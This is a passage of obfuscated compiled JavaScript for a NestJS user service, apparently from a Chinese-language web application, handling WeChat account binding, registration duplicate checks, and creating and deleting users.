this[_0x5c9bfc(0x175)][_0x5c9bfc(0x119)]({'where':{'openId':_0x495b8f}});if(_0x26c3cf)return{'status':![],'msg':_0x5c9bfc(0x196)};const _0x3cc000=await this[_0x5c9bfc(0x175)][_0x5c9bfc(0x18b)]({'id':_0x1c0427},{'openId':_0x495b8f});if(_0x3cc000[_0x5c9bfc(0x171)]<=0x0)return{'status':![],'msg':'绑定微信失败、请联系管理员！'};return{'status':!![],'msg':_0x5c9bfc(0x140)};}catch(_0x3076f1){return{'status':![],'msg':_0x5c9bfc(0x12d)};}}async['getOpenIdByUserId'](_0x2ea31a){const _0x4e9c4b=_0x447807,_0x5dd110=await this['userEntity'][_0x4e9c4b(0x119)]({'where':{'id':_0x2ea31a}});return _0x5dd110?.[_0x4e9c4b(0x150)];}async['getMiniOpenIdByUserId'](_0xadfd12){const _0x47b561=_0x447807,_0x3951c8=await this[_0x47b561(0x175)][_0x47b561(0x119)]({'where':{'id':_0xadfd12}});return _0x3951c8?.[_0x47b561(0x188)];}async[_0x447807(0x19f)](_0x13e8ee){const _0x19b905=_0x447807,{username:_0x44464a,password:_0xb9fc09,phone:_0x891bc9,phoneCode:_0x16e801}=_0x13e8ee,_0x195980=await this[_0x19b905(0x175)]['findOne']({'where':[{'username':_0x44464a},{'phone':_0x891bc9}]});if(_0x195980&&_0x195980[_0x19b905(0x187)]===_0x44464a)throw new common_1['HttpException'](_0x19b905(0x15e),common_1[_0x19b905(0x112)][_0x19b905(0x15f)]);if(_0x195980&&_0x195980['phone']===_0x891bc9)throw new common_1[(_0x19b905(0x138))]('当前手机号已注册、请勿重复注册！',common_1['HttpStatus'][_0x19b905(0x15f)]);}async['createUser'](_0x33c801){const _0x57a95c=_0x447807;return await this[_0x57a95c(0x175)][_0x57a95c(0x195)](_0x33c801);}async['delUser'](_0x542001){const _0x2028cd=_0x447807,{id:_0x2cfbe1,moreId:_0x30a75a}=_0x542001;if(_0x2cfbe1)return await this[_0x2028cd(0x175)][_0x2028cd(0x1a5)]({'id':_0x2cfbe1});if(_0x30a75a)return await this[_0x2028cd(0x175)][_0x2028cd(0x1a5)]({'id':(0x0,typeorm_2['MoreThan'])(_0x30a75a)});}async[_0x447807(0x121)](_0x1d55e6){const _0x1aed23=_0x447807,_0x86cb98=_0x1d55e6['user']['id'];return await this[_0x1aed23(0x175)][_0x1aed23(0x1a5)]({'id':_0x86cb98})[_0x1aed23(0x169)](_0x1cf65e=>_0x1cf65e['affected']>0x0);}};function _0x2ace(_0x1f52d5,_0x42d6a8){const _0x208c2b=_0x208c();return _0x2ace=function(_0x2aced5,_0x55da28){_0x2aced5=_0x2aced5-0x10a;let _0x22de0a=_0x208c2b[_0x2aced5];return _0x22de0a;},_0x2ace(_0x1f52d5,_0x42d6a8);}UserService=__decorate([(0x0,common_1[_0x447807(0x18c)])(),__param(0x0,(0x0,typeorm_1['InjectRepository'])(user_entity_1['UserEntity'])),__param(0x1,(0x0,typeorm_1['InjectRepository'])(whiteList_entity_1[_0x447807(0x184)])),__param(0x7,(0x0,typeorm_1['InjectRepository'])(config_entity_1['ConfigEntity'])),__metadata(_0x447807(0x1b9),[typeorm_2[_0x447807(0x114)],typeorm_2[_0x447807(0x114)],typeorm_2[_0x447807(0x149)],verification_service_1['VerificationService'],mailer_1['MailerService'],userBalance_service_1[_0x447807(0x1b4)],globalConfig_service_1['GlobalConfigService'],typeorm_2[_0x447807(0x114)]])],UserService),exports[_0x447807(0x12c)]=UserService;